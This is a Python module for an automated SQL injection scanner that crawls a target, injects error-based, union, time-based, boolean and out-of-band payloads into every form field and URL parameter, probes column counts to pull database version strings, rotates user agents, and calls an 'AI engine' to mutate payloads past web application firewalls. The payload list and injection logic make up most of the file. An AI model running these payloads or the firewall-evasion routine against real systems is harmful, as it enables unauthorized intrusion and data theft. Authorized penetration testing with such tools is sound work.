#!/usr/bin/env python3
"""
SQL Injection Scanner
----------------------
Tests for:
  • Error-based SQLi
  • Time-based blind SQLi
  • Boolean-based blind SQLi
  • Form parameter injection
  • GET/POST parameter injection
"""

import uuid
import time
import requests
import concurrent.futures
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, urlencode, parse_qs
from pathlib import Path
from typing import List, Dict, Optional
from rich.console import Console
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn

console = Console()

SQLI_PAYLOADS = [
    # Error-based
    "'",
    '"',
    "';",
    "`",
    "' OR '1'='1",
    "' OR '1'='1'--",
    "' OR 1=1--",
    "' OR 1=1#",
    '" OR "1"="1',
    "admin'--",
    "1' ORDER BY 1--",
    "1' ORDER BY 10--",
    "1 AND 1=1",
    "1 AND 1=2",
    # Union-based
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "1 UNION SELECT 1,2,3--",
    # Time-based (MySQL)
    "' AND SLEEP(3)--",
    "1; WAITFOR DELAY '0:0:3'--",  # MSSQL
    "'; SELECT pg_sleep(3)--",  # PostgreSQL
    # Boolean-based
    "' AND 1=1--",
    "' AND 1=2--",
    "1' AND 'x'='x",
    "1' AND 'x'='y",
]

ERROR_SIGNATURES = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "pg_query()",
    "supplied argument is not a valid mysql",
    "ora-01756",
    "microsoft ole db provider for sql server",
    "odbc sql server driver",
    "syntax error near",
    "sqlite3.operationalerror",
    "psycopg2.errors",
    "com.mysql.jdbc",
    "mssqlexception",
    "invalid sql statement",
    "sqlstate",
]


class SQLiScanner:
    """SQL Injection vulnerability scanner."""

    PAYLOAD_FILE = Path(__file__).parents[2] / "wordlists" / "payloads" / "sqli.txt"

    def __init__(self, target: str, threads: int = 10, timeout: int = 10, session=None):
        self.target = target
        self.threads = threads
        self.timeout = timeout
        if session is not None:
            self.session = session
        else:
            self.session = requests.Session()
            self.session.verify = False
        # UA Rotation
        import random

        _UAS = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
        ]
        self.session.headers["User-Agent"] = random.choice(_UAS)
        self.results: List[Dict] = []
        self._col_count_cache: dict = {}  # url -> detected column count

    # ── Load payloads ──────────────────────────────────────────────────

    def _load_payloads(self) -> List[str]:
        if self.PAYLOAD_FILE.exists():
            with open(self.PAYLOAD_FILE, encoding="utf-8") as f:
                extra = [l.strip() for l in f if l.strip()]
            return list(set(SQLI_PAYLOADS + extra))
        return SQLI_PAYLOADS

    # ── Crawl forms ────────────────────────────────────────────────────

    def _extract_forms(self, url: str) -> List[Dict]:
        forms = []
        try:
            resp = self.session.get(url, timeout=self.timeout, verify=False)
            soup = BeautifulSoup(resp.text, "lxml")
            for form in soup.find_all("form"):
                action = form.get("action", "")
                method = form.get("method", "get").lower()
                inputs = {}
                for inp in form.find_all(["input", "textarea", "select"]):
                    name = inp.get("name")
                    value = inp.get("value", "test")
                    if name:
                        inputs[name] = value
                forms.append(
                    {
                        "url": urljoin(url, action) or url,
                        "method": method,
                        "inputs": inputs,
                    }
                )
        except Exception:
            pass
        return forms

    # ── Error-based detection ──────────────────────────────────────────

    def _is_error_based(self, response_text: str) -> Optional[str]:
        text = response_text.lower()
        for sig in ERROR_SIGNATURES:
            if sig in text:
                return sig
        return None

    # ── Auto-detect column count via ORDER BY binary search ────────────

    def _detect_column_count(
        self, url: str, method: str, params: Dict, field: str
    ) -> int:
        """Use ORDER BY binary search to determine the number of columns."""
        cache_key = f"{url}|{field}"
        if cache_key in self._col_count_cache:
            return self._col_count_cache[cache_key]

        low, high = 1, 20
        while low < high:
            mid = (low + high) // 2
            payload = f"' ORDER BY {mid}--"
            test_params = params.copy()
            test_params[field] = payload
            try:
                if method == "post":
                    r = self.session.post(
                        url, data=test_params, timeout=self.timeout, verify=False
                    )
                else:
                    r = self.session.get(
                        url, params=test_params, timeout=self.timeout, verify=False
                    )
                body = r.text.lower()
                # If the ORDER BY causes an error, column count < mid
                if any(
                    s in body
                    for s in [
                        "order by",
                        "unknown column",
                        "1222",
                        "out of range",
                        "bad value",
                        "operand",
                    ]
                ):
                    high = mid
                else:
                    low = mid + 1
            except Exception:
                break

        col_count = max(1, low - 1) if low > 1 else 1
        self._col_count_cache[cache_key] = col_count
        return col_count

    def _build_union_payloads(self, col_count: int) -> List[str]:
        """Build UNION SELECT payloads for the detected column count."""
        nulls = ",".join(["NULL"] * col_count)
        nums = ",".join([str(i) for i in range(1, col_count + 1)])
        # Version string in each position
        payloads = [
            f"' UNION SELECT {nulls}--",
            f"1 UNION SELECT {nums}--",
        ]
        # Try to put version() / @@version in each position
        for i in range(1, col_count + 1):
            parts = [str(j) for j in range(1, col_count + 1)]
            parts[i - 1] = "@@version"
            payloads.append(f"1 UNION SELECT {','.join(parts)}--")
            parts[i - 1] = "version()"
            payloads.append(f"1 UNION SELECT {','.join(parts)}--")
        return payloads

    # ── Test a single parameter + payload ─────────────────────────────

    def _test_payload(
        self, url: str, method: str, params: Dict, field: str, payload: str
    ) -> Optional[Dict]:
        test_params = params.copy()
        test_params[field] = payload

        # Lazy load AI Engine
        try:
            from modules.ai.ai_engine import AIEngine

            ai = AIEngine()
        except ImportError:
            ai = None

        def do_request(curr_payload):
            test_params[field] = curr_payload
            _t0 = time.time()
            if method == "post":
                _resp = self.session.post(
                    url, data=test_params, timeout=self.timeout + 5, verify=False
                )
            else:
                _resp = self.session.get(
                    url, params=test_params, timeout=self.timeout + 5, verify=False
                )
            return _resp, time.time() - _t0

        try:
            resp, elapsed = do_request(payload)

            # --- [AI] Reinforcement Learning WAF Bypass ---
            if ai and resp.status_code in (403, 406):
                console.print(
                    f"  [dim yellow][WAF] Blocked '{payload}'. AI Agent mutating...[/dim yellow]"
                )
                mutated = ai.mutate_payload_for_waf(payload, resp.status_code)
                try:
                    resp, elapsed = do_request(mutated)
                    if resp.status_code == 200:
                        console.print(
                            f"  [bold green][AI] WAF Bypassed with: {mutated}[/bold green]"
                        )
                        payload = mutated
                except Exception:
                    pass

            # Error-based
            err_sig = self._is_error_based(resp.text)
            if err_sig:
                # --- [AI] NLP False Positive Filter ---
                if ai and ai.is_false_positive(resp.text, payload, "SQLi"):
                    return None

                return {
                    "url": url,
                    "method": method.upper(),
                    "parameter": field,
                    "payload": payload,
                    "type": "Error-based SQLi",
                    "severity": "critical",
                    "evidence": err_sig,
                    "detail": f"SQL error triggered in param '{field}'",
                    "owasp": "A03:2021 – Injection",
                    "cvss": 9.8,
                    "remediation": (
                        "Use parameterized queries / prepared statements. "
                        "Never concatenate user input into SQL strings."
                    ),
                }

            # Time-based (sleep payloads only)
            if (
                "SLEEP" in payload.upper()
                or "WAITFOR" in payload.upper()
                or "pg_sleep" in payload.lower()
            ):
                if elapsed >= 2.5:
                    return {
                        "url": url,
                        "method": method.upper(),
                        "parameter": field,
                        "payload": payload,
                        "type": "Time-based Blind SQLi",
                        "severity": "critical",
                        "evidence": f"Response delayed {elapsed:.1f}s",
                        "detail": f"Time-delay confirmed in param '{field}'",
                        "owasp": "A03:2021 – Injection",
                        "cvss": 9.8,
                        "remediation": (
                            "Use parameterized queries. "
                            "Validate and whitelist all user inputs."
                        ),
                    }

        except requests.Timeout:
            # Potential time-based if the payload contained a sleep
            if "SLEEP" in payload.upper() or "WAITFOR" in payload.upper():
                return {
                    "url": url,
                    "method": method.upper(),
                    "parameter": field,
                    "payload": payload,
                    "type": "Time-based Blind SQLi (possible)",
                    "severity": "high",
                    "evidence": "Request timed out",
                    "detail": f"Possible time-based SQLi in '{field}'",
                    "owasp": "A03:2021 – Injection",
                    "cvss": 8.5,
                    "remediation": "Use parameterized queries.",
                }
        except Exception:
            pass

        return None

    # ── Test URL query params ──────────────────────────────────────────

    def _test_url_params(self, payloads: List[str]) -> List[Dict]:
        parsed = urlparse(self.target)
        qs = parse_qs(parsed.query)
        if not qs:
            return []

        findings = []
        for field in qs:
            for payload in payloads:
                params = {k: v[0] for k, v in qs.items()}
                result = self._test_payload(self.target, "get", params, field, payload)
                if result and result not in findings:
                    findings.append(result)
        return findings

    # ── Public run ─────────────────────────────────────────────────────

    def run(self) -> List[Dict]:
        from modules.recon.crawler import WebCrawler
        from modules.web.oob_detector import OOBDetector
        from modules.web.rate_limiter import RateLimiter
        from modules.web.fp_verifier import FalsePositiveVerifier

        payloads = self._load_payloads()
        console.print(f"  [dim]-> {len(payloads)} SQLi payloads loaded[/dim]")

        # ── Wrap session with adaptive rate limiter ─────────────────────
        rl = RateLimiter(self.session, min_delay=0.05)

        # ── OOB detector for blind SQLi ─────────────────────────────────
        oob = OOBDetector(timeout=self.timeout)
        if oob.available:
            console.print(f"  [green]✅ OOB listener active: {oob._domain}[/green]")
            oob_payloads = oob.get_all_sqli_oob()
        else:
            oob_payloads = []

        # ── Crawl target first ──────────────────────────────────────────
        crawl = WebCrawler(
            self.start_url if hasattr(self, "start_url") else self.target,
            threads=self.threads,
            timeout=self.timeout,
        ).run()

        forms = crawl["forms"]
        endpoints = crawl["endpoints"]
        console.print(
            f"  [dim]-> {len(forms)} form(s) | {len(endpoints)} param endpoint(s) discovered[/dim]"
        )

        all_tests = []

        for form in forms:
            all_params = {**form.get("hidden", {}), **form["inputs"]}
            for field in form["inputs"]:
                for payload in payloads:
                    all_tests.append(
                        (
                            form["url"],
                            form["method"],
                            all_params,
                            field,
                            payload,
                        )
                    )

        from urllib.parse import parse_qs, urlparse

        for ep_url in endpoints:
            qs = parse_qs(urlparse(ep_url).query)
            for field in qs:
                params = {k: v[0] for k, v in qs.items()}
                for payload in payloads:
                    all_tests.append((ep_url, "get", params, field, payload))

        url_findings = self._test_url_params(payloads)
        self.results.extend(url_findings)

        with Progress(
            SpinnerColumn(),
            TextColumn("[cyan]SQLi scanning...[/cyan]"),
            BarColumn(),
            TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
            console=console,
        ) as progress:
            task = progress.add_task("sqli", total=max(len(all_tests), 1))
            with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as ex:
                futures = {
                    ex.submit(self._test_payload, *args): args for args in all_tests
                }
                for future in concurrent.futures.as_completed(futures):
                    progress.advance(task)
                    result = future.result()
                    if result and result not in self.results:
                        self.results.append(result)

        # ── OOB blind SQLi tests ────────────────────────────────────────
        if oob_payloads and all_tests:
            console.print(
                f"  [dim]-> Running {len(oob_payloads)} OOB blind SQLi probes...[/dim]"
            )
            # Test first injectable endpoint with OOB payloads
            first = all_tests[0]
            ep_url, method, params, field, _ = first
            for oob_payload, db_type in oob_payloads:
                test_params = params.copy()
                test_params[field] = oob_payload
                try:
                    if method == "post":
                        rl.post(
                            ep_url, data=test_params, timeout=self.timeout, verify=False
                        )
                    else:
                        rl.get(
                            ep_url,
                            params=test_params,
                            timeout=self.timeout,
                            verify=False,
                        )
                except Exception:
                    pass

            events = oob.poll(wait=6)
            if events:
                self.results.append(
                    oob.make_finding(
                        events,
                        f"SQL Injection (OOB/{db_type})",
                        ep_url,
                        oob_payload,
                        field,
                    )
                )
                console.print(
                    f"  [bold red]🔥 OOB SQLi confirmed! ({db_type})[/bold red]"
                )

        # ── False positive filter ───────────────────────────────────────
        fp = FalsePositiveVerifier(session=self.session, timeout=self.timeout)
        self.results = fp.filter_findings(self.results)

        console.print(
            f"  [{'red' if self.results else 'green'}]"
            f"{'⚠ ' + str(len(self.results)) + ' SQLi vulnerability(ies) found!' if self.results else '✅ No SQLi found'}"
            f"[/]"
        )
        return self.results
